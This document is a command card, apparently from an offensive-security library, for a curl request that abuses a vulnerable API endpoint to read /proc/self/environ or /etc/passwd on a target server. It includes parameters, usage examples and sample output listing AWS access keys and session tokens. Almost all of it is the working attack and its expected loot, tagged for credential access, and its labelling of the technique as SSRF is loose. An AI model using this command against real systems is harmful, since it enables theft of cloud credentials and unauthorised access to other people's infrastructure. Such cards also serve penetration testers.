---
id: 5aec3fae-9507-48fb-8eb6-e57e82b5733f
name: curl-ssrf-read-environment-variables
type: command
executor: bash
data: 'curl "https://$_API_ENDPOINT?cmd=file://$_FILE_PATH"'
output: null
created_at: '2023-04-06T03:56:11.578951+00:00'
updated_at: '2023-10-01T00:00:00.000000+00:00'
platforms:
  - Linux
tags:
  - ssrf
  - aws
  - credential-access
verified: true
validated: true
---

# curl-ssrf-read-environment-variables

## Command

```bash
curl "https://$_API_ENDPOINT?cmd=file://$_FILE_PATH"
```

## Description

This command uses curl to exploit an SSRF vulnerability in an API endpoint that wraps and executes system commands, reading a specified file (e.g., environment variables) from the target server. It is used in cloud environments to access internal files like /proc/self/environ without direct server access.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| $_API_ENDPOINT | The vulnerable API Gateway or application URL (e.g., apigateway/prod/system) | Yes |
| $_FILE_PATH | The internal file path to read (e.g., /proc/self/environ for env vars) | Yes |

## Examples

### Basic Usage

```bash
curl "https://apigateway/prod/system?cmd=file:///proc/self/environ"
```

### Advanced Usage

```bash
curl -s "https://apigateway/prod/system?cmd=file:///etc/passwd" | head -10
```

## Expected Output

The response body contains the raw content of the requested file, null-delimited for environment variables. Example for /proc/self/environ:

```
PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin
ingress.kubernetes.io/tls-acme:intermediate
deployment=prod
AWS_ACCESS_KEY_ID=ASIAIWO3...
AWS_SECRET_ACCESS_KEY=wJalrXUtnFEMI/...
AWS_SESSION_TOKEN=IQoJb3JpZ2luX2...
```

Success is indicated by the presence of system or AWS-specific variables without HTTP errors (e.g., 403 Forbidden).

## Related

- [[Related Procedure]]: [[procedures/Exploit-SSRF-to-Access-AWS-Instance-Metadata-Credentials]]
- [[Related Command]]: [[commands/curl-basic-http-request]]
